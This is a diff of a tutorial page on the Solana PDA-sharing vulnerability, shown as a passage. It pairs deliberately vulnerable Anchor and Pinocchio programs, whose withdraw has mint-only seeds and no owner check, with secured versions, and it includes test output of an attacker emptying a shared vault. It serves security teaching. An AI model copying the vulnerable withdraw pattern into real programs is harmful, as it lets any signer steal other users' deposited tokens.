+    Vault balance after theft: 0 tokens
+      allows attacker to steal other users' deposited tokens (567ms)
+```
+
+Notice that Bob never deposited anything, yet the shared PDA signs a transfer of all 1000 tokens to his account. The vault is now empty.
+
+## Step 3 -- Fix the program (Anchor)
+
+We need two changes:
+
+1. **Add the owner's pubkey to the PDA seeds** so each user gets a unique pool: `seeds = [b"pool", owner.key().as_ref(), mint.key().as_ref()]`.
+2. **Store the owner in account state and enforce `has_one = owner`** on withdraw so that even if an attacker references another user's pool, the constraint rejects the transaction.
+
+### Secure program dispatcher
+
+```rust filename="programs/pda-sharing/secure/anchor/src/lib.rs"
+use anchor_lang::prelude::*;
+
+declare_id!("6dKVUQcDpeq4Sh6a7QkKwW1dBR2BiJPSUFYdYQmPDHJe");
+
+pub mod instructions;
+pub mod state;
+
+pub use instructions::*;
+pub use state::*;
+
+#[program]
+pub mod secure_pda_sharing {
+    use super::*;
+
+    pub fn initialize_pool(ctx: Context<InitializePool>) -> Result<()> {
+        instructions::initialize_pool(ctx)
+    }
+
+    pub fn deposit(ctx: Context<Deposit>, amount: u64) -> Result<()> {
+        instructions::deposit(ctx, amount)
+    }
+
+    pub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
+        instructions::withdraw(ctx, amount)
+    }
+}
+```
+
+### Secure state -- now with an `owner` field
+
+```rust filename="programs/pda-sharing/secure/anchor/src/state.rs"
+use anchor_lang::prelude::*;
+
+#[account]
+pub struct TokenPool {
+    pub owner: Pubkey,
+    pub depositor: Pubkey,
+    pub mint: Pubkey,
+    pub vault: Pubkey,
+    pub bump: u8,
+}
+
+impl TokenPool {
+    pub const LEN: usize = 8 + // discriminator
+        32 + // owner
+        32 + // depositor
+        32 + // mint
+        32 + // vault
+        1; // bump
+}
+```
+
+### Secure initialize_pool
+
+Here we compare the vulnerable and secure seed derivations side by side.
+
+<CodeGroup>
+
+```rust filename="Vulnerable: programs/pda-sharing/vulnerable/anchor/src/instructions/initialize_pool.rs"
+#[account(
+    init,
+    payer = initializer,
+    space = TokenPool::LEN,
+    seeds = [b"pool", mint.key().as_ref()],  // mint only!
+    bump
+)]
+pub pool: Account<'info, TokenPool>,
+```
+
+```rust filename="Secure: programs/pda-sharing/secure/anchor/src/instructions/initialize_pool.rs"
+use anchor_lang::prelude::*;
+use anchor_spl::token::{Mint, TokenAccount};
+use crate::state::TokenPool;
+
+pub fn initialize_pool(ctx: Context<InitializePool>) -> Result<()> {
+    let pool = &mut ctx.accounts.pool;
+
+    pool.owner = ctx.accounts.owner.key();
+    pool.depositor = ctx.accounts.owner.key();
+    pool.mint = ctx.accounts.mint.key();
+    pool.vault = ctx.accounts.vault.key();
+    pool.bump = ctx.bumps.pool;
+
+    msg!("Pool initialized for owner: {}", pool.owner);
+    msg!("Mint: {}", pool.mint);
+    msg!("Vault address: {}", pool.vault);
+
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct InitializePool<'info> {
+    #[account(mut)]
+    pub owner: Signer<'info>,
+
+    // Seeds now include the owner -- each user gets a unique PDA
+    #[account(
+        init,
+        payer = owner,
+        space = TokenPool::LEN,
+        seeds = [b"pool", owner.key().as_ref(), mint.key().as_ref()],
+        bump
+    )]
+    pub pool: Account<'info, TokenPool>,
+
+    #[account(
+        constraint = vault.owner == pool.key() @ ErrorCode::InvalidVaultOwner,
+        constraint = vault.mint == mint.key() @ ErrorCode::InvalidVaultMint
+    )]
+    pub vault: Account<'info, TokenAccount>,
+
+    pub mint: Account<'info, Mint>,
+
+    pub system_program: Program<'info, System>,
+}
+
+#[error_code]
+pub enum ErrorCode {
+    #[msg("Vault must be owned by the pool PDA")]
+    InvalidVaultOwner,
+
+    #[msg("Vault mint must match pool mint")]
+    InvalidVaultMint,
+}
+```
+
 </CodeGroup>
 
-## Why This Happens
+### Secure withdraw
 
-<AccordionGroup>
-  <Accordion title="Insufficient Seed Specificity">
-    **Vulnerable seeds:**
-    ```rust
-    seeds = [b"pool", mint.key()]
-    ```
+<CodeGroup>
 
-    This creates **one pool per token mint**, not one pool per user per mint.
+```rust filename="Vulnerable: programs/pda-sharing/vulnerable/anchor/src/instructions/withdraw.rs"
+#[account(
+    seeds = [b"pool", pool.mint.as_ref()],  // mint only!
+    bump = pool.bump,
+)]
+pub pool: Account<'info, TokenPool>,
+```
 
-    **Result:** All USDC users → 1 shared pool, All SOL users → 1 shared pool
+```rust filename="Secure: programs/pda-sharing/secure/anchor/src/instructions/withdraw.rs"
+use anchor_lang::prelude::*;
+use anchor_spl::token::{self, Token, TokenAccount, Transfer};
+use crate::state::TokenPool;
 
-    **Problem:** No way to distinguish Alice's pool from Bob's pool!
-  </Accordion>
+pub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
+    let seeds = &[
+        b"pool",
+        ctx.accounts.pool.owner.as_ref(),
+        ctx.accounts.pool.mint.as_ref(),
+        &[ctx.accounts.pool.bump],
+    ];
+    let signer = &[&seeds[..]];
 
-  <Accordion title="Missing Access Control">
-    Even with shared pools, proper access control could prevent attacks:
-    ```rust
-    // Missing validation:
-    require!(pool.owner == user.key(), ErrorCode::Unauthorized);
-    ```
+    let cpi_accounts = Transfer {
+        from: ctx.accounts.vault.to_account_info(),
+        to: ctx.accounts.destination.to_account_info(),
+        authority: ctx.accounts.pool.to_account_info(),
+    };
 
-    But relying on runtime checks is fragile. **Use user-specific seeds instead!**
-  </Accordion>
+    let cpi_program = ctx.accounts.token_program.to_account_info();
+    let cpi_ctx = CpiContext::new_with_signer(cpi_program, cpi_accounts, signer);
 
-  <Accordion title="When PDA Sharing Is Intentional">
-    Sometimes shared PDAs are desired (e.g., global liquidity pools, shared vaults).
+    token::transfer(cpi_ctx, amount)?;
 
-    **Safe when:**
-    - Proper accounting tracks individual user contributions
-    - Withdrawals proportional to deposits
-    - Additional access controls validate ownership
+    Ok(())
+}
 
-    **Example:** AMM liquidity pools with LP tokens proving user share.
-  </Accordion>
-</AccordionGroup>
+#[derive(Accounts)]
+pub struct Withdraw<'info> {
+    pub owner: Signer<'info>,
 
-## The Fix
+    // has_one = owner ensures only the pool creator can withdraw
+    #[account(
+        seeds = [b"pool", pool.owner.as_ref(), pool.mint.as_ref()],
+        bump = pool.bump,
+        has_one = owner @ ErrorCode::UnauthorizedWithdrawal
+    )]
+    pub pool: Account<'info, TokenPool>,
+
+    #[account(
+        mut,
+        constraint = vault.key() == pool.vault @ ErrorCode::InvalidVault
+    )]
+    pub vault: Account<'info, TokenAccount>,
+
+    #[account(
+        mut,
+        constraint = destination.mint == pool.mint @ ErrorCode::InvalidDestinationMint,
+    )]
+    pub destination: Account<'info, TokenAccount>,
+
+    pub token_program: Program<'info, Token>,
+}
+
+#[error_code]
+pub enum ErrorCode {
+    #[msg("Only the pool owner can withdraw")]
+    UnauthorizedWithdrawal,
+
+    #[msg("Vault must match pool's vault address")]
+    InvalidVault,
+
+    #[msg("Destination mint must match pool mint")]
+    InvalidDestinationMint,
+
+    #[msg("Destination must be owned by the pool owner")]
+    InvalidDestinationOwner,
+}
+```
+
+</CodeGroup>
+
+You will see the secure test reject Bob's theft attempt and then allow Alice to withdraw her own tokens normally:
+
+```
+  Secure Implementation (Anchor)
+    FIX DEMONSTRATION:
+    1. Alice deposits 1000 tokens into HER vault...
+    Alice's vault balance: 1000 tokens
+
+    2. ATTACK ATTEMPT: Bob tries to withdraw from Alice's pool...
+    FIX CONFIRMED: Attack rejected!
+    Error: has_one = owner constraint failed
+
+    LEGITIMATE OPERATION:
+    Alice withdraws from her own pool...
+    Alice successfully withdrew: 500 tokens
+    Remaining in vault: 500 tokens
+```
+
+Notice that the `has_one = owner` constraint catches Bob immediately -- his pubkey does not match the `owner` field stored in Alice's pool account.
+
+## Step 4 -- Read the vulnerable Pinocchio implementation
+
+The same vulnerability appears in raw Pinocchio. Without Anchor's account type system, we must derive and validate the PDA manually -- and the vulnerable version derives it from `[b"pool", mint]` only.
+
+```rust filename="programs/pda-sharing/vulnerable/pinocchio/src/lib.rs"
+#![no_std]
+
+use pinocchio::{
+    entrypoint,
+    AccountView,
+    Address,
+    ProgramResult,
+};
+use solana_program_error::ProgramError;
+use pinocchio_token::instructions::Transfer;
+
+fn find_pda(seeds: &[&[u8]], program_id: &[u8]) -> (Address, u8) {
+    use solana_program::pubkey::Pubkey;
+    let program_pubkey = Pubkey::new_from_array(program_id.try_into().unwrap());
+    let (pubkey, bump) = Pubkey::find_program_address(seeds, &program_pubkey);
+    let addr_bytes: [u8; 32] = pubkey.to_bytes();
+    (Address::new_from_array(addr_bytes), bump)
+}
+
+pub mod state;
+use state::TokenPool;
+
+const ID: Address = Address::new_from_array([
+    0x50, 0x44, 0x41, 0x31, 0x50, 0x69, 0x6e, 0x6f,
+    0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31,
+    0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31,
+    0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x01,
+]);
+
+entrypoint!(process_instruction);
+
+pub fn process_instruction(
+    program_id: &Address,
+    accounts: &[AccountView],
+    instruction_data: &[u8],
+) -> ProgramResult {
+    if program_id != &ID {
+        return Err(ProgramError::IncorrectProgramId);
+    }
+
+    match instruction_data.first() {
+        Some(&0) => initialize_pool(accounts),
+        Some(&1) => {
+            if instruction_data.len() < 9 {
+                return Err(ProgramError::InvalidInstructionData);
+            }
+            let amount = u64::from_le_bytes(
+                instruction_data[1..9]
+                    .try_into()
+                    .map_err(|_| ProgramError::InvalidInstructionData)?,
+            );
+            deposit(accounts, amount)
+        }
+        Some(&2) => {
+            if instruction_data.len() < 9 {
+                return Err(ProgramError::InvalidInstructionData);
+            }
+            let amount = u64::from_le_bytes(
+                instruction_data[1..9]
+                    .try_into()
+                    .map_err(|_| ProgramError::InvalidInstructionData)?,
+            );
+            withdraw(accounts, amount)
+        }
+        _ => Err(ProgramError::InvalidInstructionData),
+    }
+}
+
+/// Expected accounts:
+/// 0. `[writable, signer]` initializer
+/// 1. `[writable]` pool PDA account
+/// 2. `[]` vault token account
+/// 3. `[]` mint
+/// 4. `[]` system_program
+fn initialize_pool(accounts: &[AccountView]) -> ProgramResult {
+    let [initializer_info, pool_info, vault_info, mint_info, _system_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !initializer_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !pool_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    // PDA derived from mint only -- shared across all users
+    let (expected_pool, bump) = find_pda(
+        &[b"pool", mint_info.address().as_ref()],
+        ID.as_ref(),
+    );
+
+    if pool_info.address().as_ref() != expected_pool.as_ref() {
+        return Err(ProgramError::InvalidSeeds);
+    }
+
+    let vault_owner = {
+        let data = vault_info.try_borrow()?;
+        let owner_bytes: [u8; 32] = data[32..64].try_into().unwrap();
+        Address::new_from_array(owner_bytes)
+    };
+
+    if vault_owner.as_ref() != expected_pool.as_ref() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    let mut pool_data = pool_info.try_borrow_mut()?;
+
+    if pool_data.len() < TokenPool::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    let mint_bytes: [u8; 32] = mint_info.address().as_ref().try_into().unwrap();
+    let vault_bytes: [u8; 32] = vault_info.address().as_ref().try_into().unwrap();
+    TokenPool::serialize(
+        &mint_bytes,
+        &vault_bytes,
+        bump,
+        &mut pool_data,
+    );
+
+    Ok(())
+}
+
+/// Expected accounts:
+/// 0. `[signer]` depositor
+/// 1. `[]` pool PDA
+/// 2. `[writable]` user's token account
+/// 3. `[writable]` vault token account
+/// 4. `[]` token program
+fn deposit(accounts: &[AccountView], amount: u64) -> ProgramResult {
+    let [depositor_info, pool_info, user_token_info, vault_info, _token_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !depositor_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    let pool_data = pool_info.try_borrow()?;
+    let pool = TokenPool::deserialize(&pool_data)
+        .map_err(|_| ProgramError::InvalidAccountData)?;
+
+    let (expected_pool, _bump) = find_pda(
+        &[b"pool", pool.mint.as_ref()],
+        ID.as_ref(),
+    );
+
+    if pool_info.address().as_ref() != expected_pool.as_ref() {
+        return Err(ProgramError::InvalidSeeds);
+    }
+
+    if vault_info.address().as_ref() != pool.vault.as_ref() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    Transfer {
+        from: user_token_info,
+        to: vault_info,
+        authority: depositor_info,
+        amount,
+    }
+    .invoke()?;
+
+    Ok(())
+}
+
+/// Expected accounts:
+/// 0. `[signer]` withdrawer (not validated against pool owner!)
+/// 1. `[]` pool PDA
+/// 2. `[writable]` vault token account
+/// 3. `[writable]` destination token account
+/// 4. `[]` token program
+fn withdraw(accounts: &[AccountView], amount: u64) -> ProgramResult {
+    let [_withdrawer_info, pool_info, vault_info, destination_info, _token_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    let pool_data = pool_info.try_borrow()?;
+    let pool = TokenPool::deserialize(&pool_data)
+        .map_err(|_| ProgramError::InvalidAccountData)?;
+
+    let (expected_pool, bump) = find_pda(
+        &[b"pool", pool.mint.as_ref()],
+        ID.as_ref(),
+    );
+
+    if pool_info.address().as_ref() != expected_pool.as_ref() {
+        return Err(ProgramError::InvalidSeeds);
+    }
+
+    if vault_info.address().as_ref() != pool.vault.as_ref() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    // The shared pool PDA signs for any withdrawal -- no owner check
+    let bump_seed = [bump];
+    let seeds = [
+        pinocchio::cpi::Seed::from(&b"pool"[..]),
+        pinocchio::cpi::Seed::from(pool.mint.as_ref()),
+        pinocchio::cpi::Seed::from(&bump_seed[..]),
+    ];
+    let signer = pinocchio::cpi::Signer::from(&seeds[..]);
+
+    Transfer {
+        from: vault_info,
+        to: destination_info,
+        authority: pool_info,
+        amount,
+    }
+    .invoke_signed(&[signer])?;
+
+    Ok(())
+}
+```
+
+The vulnerable Pinocchio state stores only mint + vault + bump (65 bytes). No owner field exists.
+
+```rust filename="programs/pda-sharing/vulnerable/pinocchio/src/state.rs"
+use pinocchio::Address;
+
+/// Memory layout:
+/// [0..32]   mint: Address (32 bytes)
+/// [32..64]  vault: Address (32 bytes)
+/// [64]      bump: u8 (1 byte)
+/// Total: 65 bytes
+pub struct TokenPool {
+    pub mint: Address,
+    pub vault: Address,
+    pub bump: u8,
+}
+
+impl TokenPool {
+    pub const LEN: usize = 32 + 32 + 1; // 65 bytes
+
+    pub fn serialize(mint: &[u8; 32], vault: &[u8; 32], bump: u8, data: &mut [u8]) {
+        data[0..32].copy_from_slice(mint);
+        data[32..64].copy_from_slice(vault);
+        data[64] = bump;
+    }
+
+    pub fn deserialize(data: &[u8]) -> Result<Self, &'static str> {
+        if data.len() < Self::LEN {
+            return Err("Account data too small");
+        }
+
+        let mut mint_bytes = [0u8; 32];
+        mint_bytes.copy_from_slice(&data[0..32]);
+
+        let mut vault_bytes = [0u8; 32];
+        vault_bytes.copy_from_slice(&data[32..64]);
+
+        Ok(TokenPool {
+            mint: Address::new_from_array(mint_bytes),
+            vault: Address::new_from_array(vault_bytes),
+            bump: data[64],
+        })
+    }
+}
+```
+
+## Step 5 -- Fix the Pinocchio implementation
+
+The secure Pinocchio version adds `owner_info.address()` to the PDA seeds and validates `pool.owner == signer` on every withdraw. The state layout grows from 65 to 97 bytes to accommodate the owner field.
+
+```rust filename="programs/pda-sharing/secure/pinocchio/src/lib.rs"
+#![no_std]
+
+use pinocchio::{
+    entrypoint,
+    AccountView,
+    Address,
+    ProgramResult,
+};
+use solana_program_error::ProgramError;
+use pinocchio_token::instructions::Transfer;
+
+fn find_pda(seeds: &[&[u8]], program_id: &[u8]) -> (Address, u8) {
+    use solana_program::pubkey::Pubkey;
+    let program_pubkey = Pubkey::new_from_array(program_id.try_into().unwrap());
+    let (pubkey, bump) = Pubkey::find_program_address(seeds, &program_pubkey);
+    let addr_bytes: [u8; 32] = pubkey.to_bytes();
+    (Address::new_from_array(addr_bytes), bump)
+}
+
+pub mod state;
+use state::TokenPool;
+
+const ID: Address = Address::new_from_array([
+    0x50, 0x44, 0x41, 0x32, 0x50, 0x69, 0x6e, 0x6f,
+    0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31,
+    0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31,
+    0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x02,
+]);
+
+entrypoint!(process_instruction);
+
+pub fn process_instruction(
+    program_id: &Address,
+    accounts: &[AccountView],
+    instruction_data: &[u8],
+) -> ProgramResult {
+    if program_id != &ID {
+        return Err(ProgramError::IncorrectProgramId);
+    }
+
+    match instruction_data.first() {
+        Some(&0) => initialize_pool(accounts),
+        Some(&1) => {
+            if instruction_data.len() < 9 {
+                return Err(ProgramError::InvalidInstructionData);
+            }
+            let amount = u64::from_le_bytes(
+                instruction_data[1..9]
+                    .try_into()
+                    .map_err(|_| ProgramError::InvalidInstructionData)?,
+            );
+            deposit(accounts, amount)
+        }
+        Some(&2) => {
+            if instruction_data.len() < 9 {
+                return Err(ProgramError::InvalidInstructionData);
+            }
+            let amount = u64::from_le_bytes(
+                instruction_data[1..9]
+                    .try_into()
+                    .map_err(|_| ProgramError::InvalidInstructionData)?,
+            );
+            withdraw(accounts, amount)
+        }
+        _ => Err(ProgramError::InvalidInstructionData),
+    }
+}
+
+/// Expected accounts:
+/// 0. `[writable, signer]` owner
+/// 1. `[writable]` pool PDA account
+/// 2. `[]` vault token account
+/// 3. `[]` mint
+/// 4. `[]` system_program
+fn initialize_pool(accounts: &[AccountView]) -> ProgramResult {
+    let [owner_info, pool_info, vault_info, mint_info, _system_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !owner_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !pool_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    // PDA derived from owner + mint -- unique per user
+    let (expected_pool, bump) = find_pda(
+        &[b"pool", owner_info.address().as_ref(), mint_info.address().as_ref()],
+        ID.as_ref(),
+    );
+
+    if pool_info.address().as_ref() != expected_pool.as_ref() {
+        return Err(ProgramError::InvalidSeeds);
+    }
+
+    let vault_owner = {
+        let data = vault_info.try_borrow()?;
+        let owner_bytes: [u8; 32] = data[32..64].try_into().unwrap();
+        Address::new_from_array(owner_bytes)
+    };
+
+    if vault_owner.as_ref() != expected_pool.as_ref() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    let mut pool_data = pool_info.try_borrow_mut()?;
+
+    if pool_data.len() < TokenPool::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    let owner_bytes: [u8; 32] = owner_info.address().as_ref().try_into().unwrap();
+    let mint_bytes: [u8; 32] = mint_info.address().as_ref().try_into().unwrap();
+    let vault_bytes: [u8; 32] = vault_info.address().as_ref().try_into().unwrap();
+    TokenPool::serialize(
+        &owner_bytes,
+        &mint_bytes,
+        &vault_bytes,
+        bump,
+        &mut pool_data,
+    );
+
+    Ok(())
+}
+
+/// Expected accounts:
+/// 0. `[signer]` depositor (must match pool owner)
+/// 1. `[]` pool PDA
+/// 2. `[writable]` user's token account
+/// 3. `[writable]` vault token account
+/// 4. `[]` token program
+fn deposit(accounts: &[AccountView], amount: u64) -> ProgramResult {
+    let [depositor_info, pool_info, user_token_info, vault_info, _token_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !depositor_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    let pool_data = pool_info.try_borrow()?;
+    let pool = TokenPool::deserialize(&pool_data)
+        .map_err(|_| ProgramError::InvalidAccountData)?;
+
+    let (expected_pool, _bump) = find_pda(
+        &[b"pool", pool.owner.as_ref(), pool.mint.as_ref()],
+        ID.as_ref(),
+    );
+
+    if pool_info.address().as_ref() != expected_pool.as_ref() {
+        return Err(ProgramError::InvalidSeeds);
+    }
+
+    // Verify depositor matches pool owner
+    if depositor_info.address().as_ref() != pool.owner.as_ref() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    if vault_info.address().as_ref() != pool.vault.as_ref() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    Transfer {
+        from: user_token_info,
+        to: vault_info,
+        authority: depositor_info,
+        amount,
+    }
+    .invoke()?;
+
+    Ok(())
+}
+
+/// Expected accounts:
+/// 0. `[signer]` owner (must match pool owner)
+/// 1. `[]` pool PDA
+/// 2. `[writable]` vault token account
+/// 3. `[writable]` destination token account
+/// 4. `[]` token program
+fn withdraw(accounts: &[AccountView], amount: u64) -> ProgramResult {
+    let [owner_info, pool_info, vault_info, destination_info, _token_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !owner_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    let pool_data = pool_info.try_borrow()?;
+    let pool = TokenPool::deserialize(&pool_data)
+        .map_err(|_| ProgramError::InvalidAccountData)?;
+
+    let (expected_pool, bump) = find_pda(
+        &[b"pool", pool.owner.as_ref(), pool.mint.as_ref()],
+        ID.as_ref(),
+    );
+
+    if pool_info.address().as_ref() != expected_pool.as_ref() {
+        return Err(ProgramError::InvalidSeeds);
+    }
+
+    // Verify signer matches pool owner
+    if owner_info.address().as_ref() != pool.owner.as_ref() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    if vault_info.address().as_ref() != pool.vault.as_ref() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    let bump_seed = [bump];
+    let seeds = [
+        pinocchio::cpi::Seed::from(&b"pool"[..]),
+        pinocchio::cpi::Seed::from(pool.owner.as_ref()),
+        pinocchio::cpi::Seed::from(pool.mint.as_ref()),
+        pinocchio::cpi::Seed::from(&bump_seed[..]),
+    ];
+    let signer = pinocchio::cpi::Signer::from(&seeds[..]);
+
+    Transfer {
+        from: vault_info,
+        to: destination_info,
+        authority: pool_info,
+        amount,
+    }
+    .invoke_signed(&[signer])?;
+
+    Ok(())
+}
+```
+
+The secure Pinocchio state adds the owner field (97 bytes total).
+
+```rust filename="programs/pda-sharing/secure/pinocchio/src/state.rs"
+use pinocchio::Address;
+
+/// Memory layout:
+/// [0..32]   owner: Address (32 bytes)
+/// [32..64]  mint: Address (32 bytes)
+/// [64..96]  vault: Address (32 bytes)
+/// [96]      bump: u8 (1 byte)
+/// Total: 97 bytes
+pub struct TokenPool {
+    pub owner: Address,
+    pub mint: Address,
+    pub vault: Address,
+    pub bump: u8,
+}
+
+impl TokenPool {
+    pub const LEN: usize = 32 + 32 + 32 + 1; // 97 bytes
+
+    pub fn serialize(owner: &[u8; 32], mint: &[u8; 32], vault: &[u8; 32], bump: u8, data: &mut [u8]) {
+        data[0..32].copy_from_slice(owner);
+        data[32..64].copy_from_slice(mint);
+        data[64..96].copy_from_slice(vault);
+        data[96] = bump;
+    }
+
+    pub fn deserialize(data: &[u8]) -> Result<Self, &'static str> {
+        if data.len() < Self::LEN {
+            return Err("Account data too small");
+        }
+
+        let mut owner_bytes = [0u8; 32];
+        owner_bytes.copy_from_slice(&data[0..32]);
+
+        let mut mint_bytes = [0u8; 32];
+        mint_bytes.copy_from_slice(&data[32..64]);
+
+        let mut vault_bytes = [0u8; 32];
+        vault_bytes.copy_from_slice(&data[64..96]);
+
+        Ok(TokenPool {
+            owner: Address::new_from_array(owner_bytes),
+            mint: Address::new_from_array(mint_bytes),
+            vault: Address::new_from_array(vault_bytes),
+            bump: data[96],
+        })
+    }
+}
+```
+
+## Side-by-side comparison
 
 <Tabs>
-  <Tab title="Anchor - Fix: User-Specific Seeds">
-    ### Include User Pubkey in Seeds
+  <Tab title="Anchor">
 
-    ```rust filename="programs/pda-sharing/secure/anchor/src/instructions/deposit.rs"
-    #[derive(Accounts)]
-    pub struct Deposit<'info> {
-        #[account(mut)]
-        pub user: Signer<'info>,
+| Aspect | Vulnerable | Secure |
+|---|---|---|
+| **PDA seeds** | `[b"pool", mint]` | `[b"pool", owner, mint]` |
+| **State fields** | `mint`, `vault`, `bump` | `owner`, `depositor`, `mint`, `vault`, `bump` |
+| **Account size** | 73 bytes (8 + 32 + 32 + 1) | 137 bytes (8 + 32 + 32 + 32 + 32 + 1) |
+| **Withdraw guard** | None -- any signer can withdraw | `has_one = owner` rejects non-owners |
+| **PDA signer seeds** | `[b"pool", mint, bump]` | `[b"pool", owner, mint, bump]` |
 
-        // FIX: Seeds include BOTH user and mint
-        // Each user gets their own pool per token type
-        #[account(
-            init_if_needed,
-            payer = user,
-            space = 8 + Pool::INIT_SPACE,
-            seeds = [
-                b"pool",
-                user.key().as_ref(),  // ✅ User-specific!
-                mint.key().as_ref(),
-            ],
-            bump,
-        )]
-        pub pool: Account<'info, Pool>,
-
-        // FIX: Vault also user-specific
-        #[account(
-            init_if_needed,
-            payer = user,
-            seeds = [
-                b"vault",
-                user.key().as_ref(),  // ✅ User-specific!
-                mint.key().as_ref(),
-            ],
-            bump,
-            token::mint = mint,
-            token::authority = pool,
-        )]
-        pub pool_vault: Account<'info, TokenAccount>,
-
-        #[account(mut)]
-        pub user_token_account: Account<'info, TokenAccount>,
-
-        pub mint: Account<'info, Mint>,
-        pub token_program: Program<'info, Token>,
-        pub system_program: Program<'info, System>,
-    }
-    ```
-
-    <Accordion title="How this prevents PDA sharing">
-      Now each user-mint combination creates a **unique PDA**:
-      - Alice's USDC pool: `[b"pool", alice.key(), USDC_MINT]`
-      - Bob's USDC pool: `[b"pool", bob.key(), USDC_MINT]`
-
-      **Bob cannot access Alice's pool** - different PDA addresses!
-    </Accordion>
   </Tab>
+  <Tab title="Pinocchio">
 
-  <Tab title="Pinocchio - Secure">
-    ### Include User in PDA Derivation
+| Aspect | Vulnerable | Secure |
+|---|---|---|
+| **PDA seeds** | `[b"pool", mint]` | `[b"pool", owner, mint]` |
+| **State fields** | `mint`, `vault`, `bump` | `owner`, `mint`, `vault`, `bump` |
+| **Account size** | 65 bytes | 97 bytes |
+| **Withdraw guard** | None -- `_withdrawer_info` is unused | `owner_info.address() == pool.owner` checked explicitly |
+| **PDA signer seeds** | `[b"pool", mint, bump]` | `[b"pool", owner, mint, bump]` |
+| **Owner validation** | Not performed | `if owner_info.address().as_ref() != pool.owner.as_ref()` |
 
-    ```rust filename="programs/pda-sharing/secure/pinocchio/src/lib.rs"
-    pub fn deposit(accounts: &[AccountInfo], amount: u64) -> ProgramResult {
-        let [
-            user_info,
-            pool_info,
-            pool_vault_info,
-            user_token_info,
-            mint_info,
-            token_program_info,
-        ] = accounts else {
-            return Err(ProgramError::NotEnoughAccountKeys);
-        };
-
-        // FIX: PDA derived with user + mint
-        let (pool_pda, _bump) = Pubkey::find_program_address(
-            &[
-                b"pool",
-                user_info.key().as_ref(),  // ✅ User-specific!
-                mint_info.key().as_ref(),
-            ],
-            &crate::ID,
-        );
-
-        if pool_info.key() != &pool_pda {
-            return Err(ProgramError::InvalidSeeds);
-        }
-
-        // Each user has their own isolated pool
-        transfer_tokens(user_token_info, pool_vault_info, amount)?;
-
-        let mut pool_data = pool_info.try_borrow_mut_data()?;
-        let mut pool = Pool::load_mut(&mut pool_data)?;
-        pool.balance += amount;
-
-        Ok(())
-    }
-    ```
-
-    <Info>
-    **Best Practice:** Always include user identity in PDA seeds for user-specific accounts. Use `[b"prefix", user.key(), resource.key()]` pattern.
-    </Info>
   </Tab>
 </Tabs>
 
-## Testing the Fix
+## Key takeaways
 
-<CodeGroup>
-```typescript Test: PDA Isolation
-it("should create separate pools per user", async () => {
-  // Alice deposits to HER pool
-  await program.methods.deposit(new BN(100))
-    .accounts({ user: alice.publicKey, mint: usdcMint })
-    .signers([alice])
-    .rpc();
+- **Always include the user's pubkey in PDA seeds for user-owned accounts.** The pattern `[b"resource", user.key(), resource_id.key()]` prevents cross-user PDA collisions.
+- **Store the owner in account state and enforce it at withdrawal time.** In Anchor use `has_one = owner`; in Pinocchio write a manual `pool.owner == signer` check.
+- **Shared PDAs are not inherently wrong, but they require per-user accounting.** AMM pools and protocol treasuries intentionally share a PDA, but they track each user's share via LP tokens or balance ledgers.
+- **Pinocchio gives you no safety net.** Forgetting a single `if` check in a raw program is equivalent to leaving the vault door open.
+- **Test for cross-user access, not just happy paths.** A single `withdraw` call with the wrong signer is enough to catch this vulnerability before mainnet.
 
-  // Bob deposits to HIS pool (different PDA!)
-  await program.methods.deposit(new BN(50))
-    .accounts({ user: attacker.publicKey, mint: usdcMint })
-    .signers([attacker])
-    .rpc();
+## Run it yourself
 
-  // Pools are SEPARATE
-  const alicePoolPda = derivePoolPda(alice.publicKey, usdcMint);
-  const bobPoolPda = derivePoolPda(attacker.publicKey, usdcMint);
+```bash
+# Clone the repository
+git clone https://github.com/danielAsaboro/solana_badger
+cd solana_badger
 
-  expect(alicePoolPda).not.toEqual(bobPoolPda);  // Different PDAs!
+# Install dependencies
+npm install
 
-  const alicePool = await program.account.pool.fetch(alicePoolPda);
-  const bobPool = await program.account.pool.fetch(bobPoolPda);
+# Run the Anchor PDA sharing tests (vulnerable + secure)
+anchor test -- --grep "PDA Sharing"
 
-  expect(alicePool.balance).toEqual(100);  // Alice's balance
-  expect(bobPool.balance).toEqual(50);     // Bob's balance
-
-  // Bob CANNOT withdraw from Alice's pool
-  try {
-    await program.methods.withdraw(new BN(100))
-      .accounts({ user: attacker.publicKey, mint: usdcMint })
-      .remainingAccounts([{ pubkey: alicePoolPda, ...}])  // Try Alice's pool
-      .signers([attacker])
